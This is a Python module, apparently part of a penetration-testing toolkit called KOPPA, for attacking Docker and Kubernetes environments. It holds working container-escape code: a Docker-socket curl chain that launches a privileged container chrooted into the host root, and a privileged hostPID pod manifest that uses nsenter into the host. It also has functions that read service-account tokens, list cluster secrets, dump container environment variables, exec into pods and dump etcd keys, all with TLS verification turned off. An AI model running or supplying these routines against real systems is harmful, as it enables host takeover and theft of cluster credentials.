"""KOPPA stdlib: container — Docker/Kubernetes security testing."""
import subprocess, re, json, urllib.request, ssl, os

_ctx = ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode    = ssl.CERT_NONE


def _sh(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
        return r.stdout.decode(errors="replace").strip()
    except Exception:
        return ""


# ── Docker ───────────────────────────────────────────────────────────────���────
def is_container():
    """Detect if running inside a container."""
    checks = [
        os.path.exists("/.dockerenv"),
        os.path.exists("/run/.containerenv"),
        "docker" in _sh("cat /proc/1/cgroup 2>/dev/null"),
        "kubepod" in _sh("cat /proc/1/cgroup 2>/dev/null"),
    ]
    return any(checks)

def docker_socket(path="/var/run/docker.sock"):
    """Check if Docker socket is accessible."""
    return os.path.exists(path) and os.access(path, os.R_OK)

def docker_api(path="/containers/json"):
    """Query Docker REST API via UNIX socket."""
    out = _sh(f"curl -s --unix-socket /var/run/docker.sock http://localhost{path} 2>/dev/null")
    try:    return json.loads(out)
    except: return out

def docker_escape_check():
    """Check for common container escape vectors."""
    findings = []
    if docker_socket():
        findings.append("Docker socket accessible: /var/run/docker.sock — ESCAPE possible")
    if _sh("id"):
        uid = _sh("id -u")
        if uid == "0":
            findings.append("Running as root inside container")
    caps = _sh("cat /proc/self/status 2>/dev/null | grep CapEff")
    if caps:
        findings.append(f"Capabilities: {caps}")
    if _sh("ls /proc/sysrq-trigger 2>/dev/null"):
        findings.append("Kernel SysRq interface accessible")
    mounts = _sh("cat /proc/mounts 2>/dev/null")
    for dangerous in ["/etc/shadow", "/host", "/sys/kernel"]:
        if dangerous in mounts:
            findings.append(f"Host path mounted: {dangerous}")
    return findings

def docker_escape_socket():
    """Escape via Docker socket — spawn host shell container."""
    return (
        "curl -s --unix-socket /var/run/docker.sock "
        "-X POST 'http://localhost/containers/create' "
        "-H 'Content-Type: application/json' "
        "-d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\",\"-c\",\"chroot /host sh\"],"
        "\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true}}' | "
        "python3 -c \"import sys,json; d=json.load(sys.stdin); print(d['Id'])\" | "
        "xargs -I{} sh -c 'curl -s --unix-socket /var/run/docker.sock "
        "-X POST http://localhost/containers/{}/start && "
        "curl -s --unix-socket /var/run/docker.sock "
        "-X POST http://localhost/containers/{}/wait'"
    )

def docker_enum():
    """Enumerate Docker environment."""
    return {
        "images":     json.loads(_sh("docker images --format '{{json .}}' 2>/dev/null") or "[]"),
        "containers": json.loads(_sh("docker ps -a --format '{{json .}}' 2>/dev/null") or "[]"),
        "networks":   json.loads(_sh("docker network ls --format '{{json .}}' 2>/dev/null") or "[]"),
        "volumes":    json.loads(_sh("docker volume ls --format '{{json .}}' 2>/dev/null") or "[]"),
        "secrets":    _sh("docker secret ls 2>/dev/null"),
    }

def docker_inspect_env(container_id):
    """Dump environment variables from a container."""
    out = _sh(f"docker inspect {container_id} 2>/dev/null")
    try:
        data = json.loads(out)
        env  = data[0].get("Config", {}).get("Env", [])
        return dict(e.split("=", 1) for e in env if "=" in e)
    except Exception:
        return {}


# ── Kubernetes ────────────────────────────────────────────────────────────────
def k8s_token():
    """Read service account token from default mount."""
    try:
        with open("/var/run/secrets/kubernetes.io/serviceaccount/token") as f:
            return f.read().strip()
    except Exception:
        return ""

def k8s_api(path, token=None, host="https://kubernetes.default.svc", verify=False):
    """Query Kubernetes API server."""
    token = token or k8s_token()
    url   = host.rstrip("/") + path
    req   = urllib.request.Request(url, headers={
        "Authorization": f"Bearer {token}",
        "Content-Type":  "application/json",
    })
    try:
        with urllib.request.urlopen(req, timeout=10, context=_ctx) as r:
            return json.loads(r.read())
    except Exception as e:
        return {"error": str(e)}

def k8s_pods(namespace="default", token=None):
    return k8s_api(f"/api/v1/namespaces/{namespace}/pods", token)

def k8s_secrets(namespace="default", token=None):
    return k8s_api(f"/api/v1/namespaces/{namespace}/secrets", token)

def k8s_service_accounts(namespace="default", token=None):
    return k8s_api(f"/api/v1/namespaces/{namespace}/serviceaccounts", token)

def k8s_exec(pod, cmd, namespace="default", container=None, token=None):
    """Execute command in K8s pod via kubectl."""
    c_flag = f"-c {container}" if container else ""
    return _sh(
        f"kubectl exec -n {namespace} {pod} {c_flag} -- {cmd} 2>/dev/null"
    )

def k8s_check_permissions(token=None):
    """Check what the current SA token can do."""
    verbs    = ["get", "list", "create", "delete", "exec"]
    resources = ["pods", "secrets", "services", "deployments", "namespaces"]
    results  = {}
    for res in resources:
        results[res] = {}
        for verb in verbs:
            out = _sh(f"kubectl auth can-i {verb} {res} 2>/dev/null")
            results[res][verb] = "yes" in out.lower()
    return results

def k8s_escape():
    """Generate privesc YAML for privileged pod escape."""
    return """apiVersion: v1
kind: Pod
metadata:
  name: koppa-escape
spec:
  hostPID: true
  hostNetwork: true
  hostIPC: true
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh","-c","nsenter -t 1 -m -u -i -n /bin/sh"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
"""

def etcd_dump(endpoint="http://127.0.0.1:2379"):
    """Dump all etcd keys (unauthenticated)."""
    return _sh(
        f"etcdctl --endpoints={endpoint} get / --prefix --keys-only 2>/dev/null | head -50"
    )
